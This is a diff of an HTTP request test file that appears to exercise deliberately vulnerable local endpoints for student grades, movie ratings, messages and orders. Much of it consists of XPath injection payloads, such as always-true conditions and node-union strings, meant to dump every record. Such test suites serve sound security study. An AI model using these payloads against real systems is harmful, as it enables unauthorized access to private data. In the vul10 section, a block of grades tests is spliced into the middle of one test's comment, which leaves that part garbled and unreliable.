@@ -61,52 +61,17 @@ Accept: application/json
 # @expect: 200 OK with potentially sensitive data
 
 ###vul8
-### 1. Normal request - should return 200 OK
+### 1. 정상 요청 (200 OK)
 GET http://localhost:3000/grades?studentId=s1001
-Accept: application/json
 
-### 2. Request with spaces - should return 200 OK (spaces are trimmed)
-GET http://localhost:3000/grades?studentId=  s1002  
-Accept: application/json
-
-### 3. Invalid ID format - should return 400 Bad Request
-GET http://localhost:3000/grades?studentId=abc123
-Accept: application/json
-
-### 4. Missing parameter - should return 400 Bad Request
-GET http://localhost:3000/grades
-Accept: application/json
-
-### 5. Basic XPath Injection - should return 200 OK and reveal all records
-# This bypasses authentication by making the condition always true
+### 2. XPath 인젝션 - 모든 학생 반환 (200 OK)
 GET http://localhost:3000/grades?studentId=s1001' or '1'='1
-Accept: application/json
 
-### 6. XPath Injection with comment - should return 200 OK and reveal all records
-# This comments out the rest of the expression
-GET http://localhost:3000/grades?studentId=s1001']|//*|//*['
-Accept: application/json
+### 3. XPath 인젝션 - 첫 번째 학생 추출 (200 OK)
+GET http://localhost:3000/grades?studentId=s1001'] | //student[1] | student['
 
-### 7. XPath Injection to get first record - should return 200 OK
-# This uses XPath position() function
-GET http://localhost:3000/grades?studentId=' or position()=1 or '
-Accept: application/json
-
-### 8. XPath Injection with string concatenation - should return 200 OK
-# This demonstrates string manipulation in XPath
-GET http://localhost:3000/grades?studentId=' or contains(name,'a') or '
-Accept: application/json
-
-### 9. XPath Injection with boolean expression - should return 200 OK
-# This uses boolean logic to bypass authentication
-GET http://localhost:3000/grades?studentId=' or true() or '
-Accept: application/json
-
-### 10. XPath Injection with node selection - should return 200 OK
-# This selects all student nodes regardless of ID
-GET http://localhost:3000/grades?studentId=']|//student|//student['
-Accept: application/json
-
+### 4. XPath 인젝션 - 전체 데이터 추출 (200 OK)
+GET http://localhost:3000/grades?studentId=s1001'] | //* | student['
 ### vul9
 ### 1. Normal Request - Valid Movie (Should return 200 OK)
 GET http://localhost:3000/movies/rating?movieTitle=The%20Shawshank%20Redemption
@@ -208,4 +173,86 @@ Accept: application/json
 
 ### 5. XPath 인젝션 (모든 노드 반환) - 200 OK
 GET http://localhost:3000/messages/from?sender=alice@example.com']|//*|//*['
+Accept: application/json
+
+###vul 10
+### 1. Normal request - valid order ID
+# Expected: 200 OK with order details
+GET http://localhost:3000/order/detail?orderId=ORD-1001
+Accept: application/json
+
+### 2. Normal request - invalid order ID
+# Expected: 404 Not Found
+GET http://localhost:3000/order/detail?orderId=ORD-9999
+Accept: application/json
+
+### 3. Missing orderId parameter
+# Expected: 400 Bad Request
+GET http://localhost:3000/order/detail
+Accept: application/json
+
+### 4. XPath Injection - Basic boolean-based attack
+# Attempts to make the condition always true
+# Expected: 200 OK (vulnerability exploited - might return first order)
+GET http://localhost:3000/order/detail?orderId=ORD-1001' or '1'='1
+Accept: application/json
+
+### 5. XPath Injection - Comment-based attack
+# Attempts to comment out the rest of the condition
+# Expected: 200 OK (vulnerability exploited - might return first order)
+GET http://localhost:3000/order/detail?orderId=ORD-1001'] | //order[1] | /foo['
+Accept: application/json
+
+### 6. XPath Injection - Union attack
+# Attempts to combine results### 1. Normal Request (200 OK)
+GET http://localhost:3000/grades?studentId=s1001
+Accept: application/json
+
+### 2. Invalid ID Format (400 Bad Request)
+GET http://localhost:3000/grades?studentId=abc123
+Accept: application/json
+
+### 3. XPath Injection - Always True Condition (200 OK - Should return first student)
+GET http://localhost:3000/grades?studentId=s1001' or '1'='1
+Accept: application/json
+
+### 4. XPath Injection - Comment Bypass (200 OK - Should return first student)
+GET http://localhost:3000/grades?studentId=s1001'] | //student[1] | student['
+Accept: application/json
+
+### 5. XPath Injection - Node Extraction (200 OK - Should return all data)
+GET http://localhost:3000/grades?studentId=s1001'] | //* | student['
+Accept: application/json
+
+### 6. XPath Injection - Boolean Blind (200 OK - Should return first student if true)
+GET http://localhost:3000/grades?studentId=s1001' and contains(name,'Alice') or '
+Accept: application/json
+
+### 7. Malformed Input (400 Bad Request)
+GET http://localhost:3000/grades?studentId=
+Accept: application/json
+
+### 8. Valid ID with Spaces (200 OK - Spaces should be trimmed)
+GET http://localhost:3000/grades?studentId=  s1002  
+Accept: application/json from different paths
+# Expected: 200 OK (vulnerability exploited - might return multiple orders)
+GET http://localhost:3000/order/detail?orderId='] | //order | /foo['
+Accept: application/json
+
+### 7. XPath Injection - String termination attack
+# Attempts to terminate the string and add malicious condition
+# Expected: 200 OK (vulnerability exploited - might return first order)
+GET http://localhost:3000/order/detail?orderId=' or 1=1 or ''='
+Accept: application/json
+
+### 8. XPath Injection - Information disclosure
+# Attempts to access all customer names
+# Expected: 200 OK (vulnerability exploited - might return data it shouldn't)
+GET http://localhost:3000/order/detail?orderId='] | //customer | /foo['
+Accept: application/json
+
+### 9. XPath Injection - DOS attempt with long input
+# Tests the length validation (50 chars)
+# Expected: 400 Bad Request
+GET http://localhost:3000/order/detail?orderId=ORD-1001XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 Accept: application/json
